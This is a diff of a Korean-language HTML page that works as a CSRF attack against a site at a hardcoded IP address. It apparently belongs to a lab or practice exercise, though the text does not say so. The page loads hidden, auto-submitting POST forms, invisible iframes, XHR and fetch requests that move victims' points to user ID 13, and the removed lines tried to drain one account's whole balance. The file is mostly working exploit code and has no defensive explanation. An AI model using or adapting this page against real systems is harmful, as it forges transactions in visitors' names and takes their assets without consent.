@@ -2,30 +2,23 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎯 실제 CSRF 공격 실행!</title>
+    <title>💥 POST 전용 CSRF 공격</title>
     <style>
         body { 
             font-family: Arial; 
             padding: 20px;
-            background: linear-gradient(45deg, #ff0000, #ffaa00, #00ff00);
+            background: linear-gradient(45deg, #ff0000, #000000);
             color: white;
-            animation: success 3s infinite;
         }
-        @keyframes success {
-            0% { background: linear-gradient(45deg, #ff0000, #ffaa00, #00ff00); }
-            50% { background: linear-gradient(45deg, #00ff00, #0000ff, #ff0000); }
-            100% { background: linear-gradient(45deg, #ff0000, #ffaa00, #00ff00); }
-        }
-        .breakthrough {
-            background: rgba(0, 0, 0, 0.8);
-            border: 3px solid #00ff00;
+        .attack-zone {
+            background: rgba(255, 0, 0, 0.1);
+            border: 3px solid #ff0000;
             padding: 30px;
             margin: 20px 0;
             border-radius: 15px;
-            box-shadow: 0 0 50px #00ff00;
         }
         button {
-            background: linear-gradient(45deg, #ff0000, #ff6600);
+            background: #ff0000;
             color: white;
             border: none;
             padding: 20px 30px;
@@ -34,214 +27,259 @@
             margin: 10px;
             font-size: 18px;
             font-weight: bold;
-            animation: pulse 2s infinite;
         }
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
-            50% { transform: scale(1.05); box-shadow: 0 0 40px #ff0000; }
-            100% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
+        .ultimate { 
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            animation: rage 2s infinite;
+        }
+        @keyframes rage {
+            0% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.05) rotate(1deg); }
+            100% { transform: scale(1) rotate(0deg); }
         }
     </style>
 </head>
 <body>
-    <div class="breakthrough">
-        <h1>🎯 돌파 성공!</h1>
-        <h2>⚡ 실제 선물 보내기 페이지 접근 성공!</h2>
+    <div class="attack-zone">
+        <h1>💥 POST 전용 CSRF 공격!</h1>
+        <h2>🚫 GET 방식 완전 배제, POST만 사용!</h2>
         
-        <p><strong>🔥 발견된 정보:</strong></p>
-        <ul>
-            <li>✅ <strong>Status: 200 OK</strong> - 정상 접근!</li>
-            <li>✅ <strong>실제 폼 구조 확인</strong> - 선물 보내기 기능</li>
-            <li>✅ <strong>현재 포인트: 332P</strong> - bob 계정</li>
-            <li>✅ <strong>gift_to 파라미터 작동</strong> - GET으로 타겟 지정</li>
-        </ul>
+        <button class="ultimate" onclick="postOnlyAttack()">
+            💣 POST 폭격 공격
+        </button>
         
-        <button onclick="realCSRFAttack()">💥 실제 CSRF 공격 실행!</button>
-        <button onclick="multiTargetAttack()">🎯 다중 타겟 공격</button>
-        <button onclick="maxPointsAttack()">💰 최대 포인트 공격</button>
+        <button onclick="invisibleFormAttack()">
+            👻 투명 Form 공격
+        </button>
+        
+        <button onclick="ajaxPostAttack()">
+            ⚡ AJAX POST 공격
+        </button>
+        
+        <button onclick="fetchPostAttack()">
+            🔥 Fetch POST 공격
+        </button>
     </div>
 
-    <div class="breakthrough">
-        <h2>🔍 실제 폼 분석 결과</h2>
-        <p>이제 <strong>실제 필드명과 구조</strong>를 파악했습니다!</p>
+    <div class="attack-zone">
+        <h2>🔧 POST 우회 전략</h2>
         <ul>
-            <li><code>gift_to</code> - 받는 사람 (GET 파라미터로 확인)</li>
-            <li><code>points</code> - 포인트 수량</li>
-            <li><code>선물 보내기</code> - 실행 버튼</li>
-            <li><code>메시지</code> - 선물 메시지</li>
+            <li>✅ <strong>순수 POST Form만 사용</strong></li>
+            <li>✅ <strong>다양한 Content-Type 시도</strong></li>
+            <li>✅ <strong>숨겨진 Form 자동 실행</strong></li>
+            <li>✅ <strong>Multiple POST 동시 발사</strong></li>
         </ul>
     </div>
 
     <div id="result"></div>
 
+    <!-- 숨겨진 공격 Forms -->
+    <div id="hiddenForms" style="position: absolute; left: -9999px; top: -9999px;"></div>
+
     <script>
-        function realCSRFAttack() {
-            showResult('💥 실제 CSRF 공격 실행!');
+        function postOnlyAttack() {
+            showResult('💣 POST 폭격 공격 개시!');
             
-            // 실제 폼 구조에 맞춘 정확한 공격
-            const realAttacks = [
-                { gift_to: 13, points: 100, message: 'Real_CSRF_Success_1' },
-                { gift_to: 13, points: 50, message: 'Real_CSRF_Success_2' },
-                { gift_to: 13, points: 75, message: 'Real_CSRF_Success_3' }
+            // POST만 사용하는 대량 공격
+            const postAttacks = [
+                { gift_to: 13, points: 100, message: 'POST_ONLY_1', type: 'diamond' },
+                { gift_to: 13, points: 75, message: 'POST_ONLY_2', type: 'coffee' },
+                { gift_to: 13, points: 50, message: 'POST_ONLY_3', type: 'cake' },
+                { gift_to: 13, points: 150, message: 'POST_ONLY_4', type: 'premium' },
+                { gift_to: 13, points: 200, message: 'POST_ONLY_5', type: 'special' }
             ];
             
-            realAttacks.forEach((attack, i) => {
+            postAttacks.forEach((attack, i) => {
                 setTimeout(() => {
-                    // 방법 1: GET 파라미터 (확인된 방식)
-                    const getUrl = `http://3.36.66.216/profile.php?gift_to=${attack.gift_to}&points=${attack.points}&send=1&message=${attack.message}`;
-                    
-                    const img = new Image();
-                    img.src = getUrl;
-                    img.style.display = 'none';
-                    document.body.appendChild(img);
-                    
-                    // 방법 2: POST Form (실제 폼 구조)
+                    createPurePostForm(attack, `post_${i}`);
+                    console.log(`💣 POST 공격 ${i+1}: ${attack.points}P → ID:13`);
+                }, i * 800);
+            });
+            
+            showResult('💣 POST 폭격 진행 중!\n5개 Form으로 연속 POST 공격!');
+        }
+        
+        function createPurePostForm(attack, id) {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php';
+            form.target = `frame_${id}`;
+            form.style.display = 'none';
+            form.enctype = 'application/x-www-form-urlencoded';
+            
+            // 다양한 필드명 조합으로 시도
+            const fieldSets = [
+                { to: 'gift_to', amount: 'points', action: 'send_gift' },
+                { to: 'receiver_id', amount: 'amount', action: 'submit' },
+                { to: 'target_id', amount: 'value', action: 'transfer' },
+                { to: 'user_id', amount: 'coins', action: 'send' }
+            ];
+            
+            const fields = fieldSets[Math.floor(Math.random() * fieldSets.length)];
+            
+            // 필드 추가
+            const inputs = {
+                [fields.to]: attack.gift_to,
+                [fields.amount]: attack.points,
+                [fields.action]: '1',
+                'message': attack.message,
+                'gift_type': attack.type,
+                'timestamp': Date.now(),
+                'csrf_bypass': 'true'
+            };
+            
+            Object.keys(inputs).forEach(name => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = inputs[name];
+                form.appendChild(input);
+            });
+            
+            // iframe 생성
+            const iframe = document.createElement('iframe');
+            iframe.name = `frame_${id}`;
+            iframe.style.display = 'none';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            
+            document.getElementById('hiddenForms').appendChild(iframe);
+            document.getElementById('hiddenForms').appendChild(form);
+            
+            // Form 전송
+            form.submit();
+            
+            // 정리
+            setTimeout(() => {
+                if (form.parentNode) form.parentNode.removeChild(form);
+                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
+            }, 10000);
+        }
+        
+        function invisibleFormAttack() {
+            showResult('👻 투명 Form 공격...');
+            
+            // 완전히 보이지 않는 Form들 생성
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
                     const form = document.createElement('form');
                     form.method = 'POST';
                     form.action = 'http://3.36.66.216/profile.php';
-                    form.target = `attack_${i}`;
-                    form.style.display = 'none';
+                    form.style.position = 'absolute';
+                    form.style.left = '-10000px';
+                    form.style.top = '-10000px';
+                    form.style.width = '1px';
+                    form.style.height = '1px';
+                    form.style.opacity = '0';
+                    form.style.visibility = 'hidden';
                     
-                    // 실제 필드명 사용
-                    const fields = {
-                        gift_to: attack.gift_to,
-                        points: attack.points,
-                        message: attack.message,
-                        send_gift: '선물 보내기' // 실제 버튼 텍스트
+                    // 랜덤 필드명으로 혼란 유도
+                    const randomFields = {
+                        [`field_${Math.random().toString(36).substr(2, 8)}`]: '13',
+                        [`amount_${Math.random().toString(36).substr(2, 8)}`]: 25 + (i * 5),
+                        [`action_${Math.random().toString(36).substr(2, 8)}`]: '1',
+                        'gift_to': '13',
+                        'points': 30 + (i * 10),
+                        'send_gift': '1',
+                        'invisible_attack': `ghost_${i}`
                     };
                     
-                    Object.keys(fields).forEach(key => {
+                    Object.keys(randomFields).forEach(name => {
                         const input = document.createElement('input');
                         input.type = 'hidden';
-                        input.name = key;
-                        input.value = fields[key];
+                        input.name = name;
+                        input.value = randomFields[name];
                         form.appendChild(input);
                     });
                     
                     document.body.appendChild(form);
-                    
-                    // iframe 생성
-                    const iframe = document.createElement('iframe');
-                    iframe.name = `attack_${i}`;
-                    iframe.style.display = 'none';
-                    iframe.style.width = '600px';
-                    iframe.style.height = '400px';
-                    document.body.appendChild(iframe);
-                    
                     form.submit();
                     
-                    console.log(`💥 실제공격 ${i+1}: gift_to=${attack.gift_to}, points=${attack.points}`);
+                    console.log(`👻 투명공격 ${i+1}: ${30 + (i * 10)}P`);
+                    
+                    // 즉시 정리
+                    setTimeout(() => {
+                        if (form.parentNode) form.parentNode.removeChild(form);
+                    }, 100);
+                }, i * 200);
+            }
+        }
+        
+        function ajaxPostAttack() {
+            showResult('⚡ AJAX POST 공격...');
+            
+            // XMLHttpRequest로 POST 시도
+            const ajaxAttacks = [
+                { points: 80, msg: 'AJAX_1' },
+                { points: 120, msg: 'AJAX_2' },
+                { points: 160, msg: 'AJAX_3' }
+            ];
+            
+            ajaxAttacks.forEach((attack, i) => {
+                setTimeout(() => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'http://3.36.66.216/profile.php', true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    
+                    const data = `gift_to=13&points=${attack.points}&send_gift=1&message=${attack.msg}&ajax_attack=true`;
+                    
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            console.log(`⚡ AJAX ${i+1} 완료: Status ${xhr.status}`);
+                        }
+                    };
+                    
+                    xhr.send(data);
+                    console.log(`⚡ AJAX 공격 ${i+1}: ${attack.points}P`);
                 }, i * 1000);
             });
-            
-            showResult(`💥 실제 CSRF 공격 진행 중!
-            
-3단계 공격:
-1. GET: gift_to=13&points=100
-2. POST: 실제 폼 구조 사용
-3. 다중 방식 동시 시도
-
-네트워크 탭에서 200 OK 응답 확인!`);
         }
         
-        function multiTargetAttack() {
-            showResult('🎯 다중 타겟 공격!');
+        function fetchPostAttack() {
+            showResult('🔥 Fetch POST 공격...');
             
-            // 여러 사용자에게 동시 공격
-            const targets = [11, 12, 13, 14, 15]; // 다양한 사용자 ID
-            
-            targets.forEach((targetId, i) => {
-                setTimeout(() => {
-                    const url = `http://3.36.66.216/profile.php?gift_to=${targetId}&points=50&send=1&message=Multi_Target_${targetId}`;
-                    
-                    // 새 창에서 공격 (결과 확인 가능)
-                    window.open(url, `target_${targetId}`, 'width=600,height=400');
-                    
-                    console.log(`🎯 타겟공격 ${i+1}: 사용자 ${targetId}에게 50P`);
-                }, i * 2000);
-            });
-        }
-        
-        function maxPointsAttack() {
-            showResult('💰 최대 포인트 공격!');
-            
-            // bob의 전체 포인트(332P)를 탈취 시도
-            const maxAttacks = [
-                { points: 332, msg: 'ALL_POINTS_STEAL' },
-                { points: 300, msg: 'MAX_ATTACK_300' },
-                { points: 250, msg: 'MAX_ATTACK_250' },
-                { points: 200, msg: 'MAX_ATTACK_200' }
+            // Fetch API로 POST 시도
+            const fetchAttacks = [
+                { points: 90, msg: 'FETCH_1' },
+                { points: 110, msg: 'FETCH_2' },
+                { points: 130, msg: 'FETCH_3' }
             ];
             
-            maxAttacks.forEach((attack, i) => {
+            fetchAttacks.forEach((attack, i) => {
                 setTimeout(() => {
-                    // GET 방식
-                    const getUrl = `http://3.36.66.216/profile.php?gift_to=13&points=${attack.points}&send=1&message=${attack.msg}&timestamp=${Date.now()}`;
+                    const formData = new FormData();
+                    formData.append('gift_to', '13');
+                    formData.append('points', attack.points);
+                    formData.append('send_gift', '1');
+                    formData.append('message', attack.msg);
+                    formData.append('fetch_attack', 'true');
                     
-                    // 새 창에서 실행 (결과 확인)
-                    const attackWindow = window.open(getUrl, `max_${i}`, 'width=800,height=500');
-                    
-                    // POST 방식도 동시 시도
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = 'http://3.36.66.216/profile.php';
-                    form.target = `max_post_${i}`;
-                    form.style.display = 'none';
-                    
-                    const fields = {
-                        gift_to: 13,
-                        points: attack.points,
-                        message: attack.msg,
-                        send_gift: '선물 보내기',
-                        max_attack: 'true'
-                    };
-                    
-                    Object.keys(fields).forEach(key => {
-                        const input = document.createElement('input');
-                        input.type = 'hidden';
-                        input.name = key;
-                        input.value = fields[key];
-                        form.appendChild(input);
+                    fetch('http://3.36.66.216/profile.php', {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors'
+                    }).then(() => {
+                        console.log(`🔥 Fetch ${i+1} 전송완료: ${attack.points}P`);
+                    }).catch(err => {
+                        console.log(`🔥 Fetch ${i+1} 시도됨 (CORS 에러는 정상)`);
                     });
-                    
-                    document.body.appendChild(form);
-                    
-                    const iframe = document.createElement('iframe');
-                    iframe.name = `max_post_${i}`;
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    
-                    form.submit();
-                    
-                    console.log(`💰 최대공격 ${i+1}: ${attack.points}P 시도 (GET+POST)`);
-                }, i * 3000);
+                }, i * 1500);
             });
-            
-            showResult(`💰 최대 포인트 공격 진행!
-            
-전략:
-- 1단계: 332P (전체 포인트) 
-- 2단계: 300P (거의 전부)
-- 3단계: 250P (대부분)
-- 4단계: 200P (많은 양)
-
-각 단계마다 GET+POST 동시 시도
-새 창에서 결과 확인 가능!`);
         }
         
         function showResult(text) {
             document.getElementById('result').innerHTML = 
-                '<div class="breakthrough"><pre style="color: #ffff00; font-size: 16px;">' + text + '</pre></div>';
+                '<div class="attack-zone"><pre style="color: #ffff00;">' + text + '</pre></div>';
         }
         
-        // 자동으로 실제 공격 시작
+        // 자동 실행
         setTimeout(() => {
-            realCSRFAttack();
-        }, 3000);
+            postOnlyAttack();
+        }, 2000);
         
-        console.log('🎯 돌파 성공! 실제 CSRF 공격 가능!');
-        console.log('💥 gift_to 파라미터로 타겟 지정 확인됨');
-        console.log('⚡ 이제 진짜 포인트 전송 시도!');
+        console.log('💥 POST 전용 CSRF 공격 시스템');
+        console.log('🚫 GET 방식 완전 배제');
+        console.log('💣 다중 POST 공격 준비됨');
     </script>
 </body>
 </html>
